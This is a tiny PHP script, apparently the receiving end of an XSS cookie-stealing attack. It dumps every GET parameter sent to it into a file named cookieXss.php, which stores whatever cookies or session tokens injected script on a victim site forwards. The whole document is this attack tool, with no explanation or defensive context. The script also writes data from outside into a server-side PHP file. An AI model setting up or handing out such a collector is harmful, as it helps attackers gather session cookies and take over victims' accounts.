<?php
    file_put_contents("cookieXss.php","<?php \nreturn ".var_export($_GET,true)."\n;?>");